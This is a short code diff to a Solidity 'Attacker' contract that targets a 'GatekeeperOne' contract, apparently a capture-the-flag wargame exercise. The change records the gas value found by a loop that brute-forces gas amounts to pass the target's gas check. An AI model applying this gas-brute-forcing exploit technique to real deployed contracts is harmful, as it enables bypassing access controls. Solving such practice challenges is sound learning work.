@@ -7,6 +7,7 @@ contract Attacker {
     address owner;
     GatekeeperOne target;
     bytes8 key;
+    uint256 public $gas;
 
     constructor(GatekeeperOne _target) {
         target = _target;
@@ -24,7 +25,7 @@ contract Attacker {
         for (int256 i = 0; i <= 8191; i++) {
             uint256 gas = uint256(30000 - i);
             try target.enter{gas: gas}(key) {
-                // console.log(gas); // print once to see correct gas
+                $gas = gas;
                 break;
             } catch {}
         }
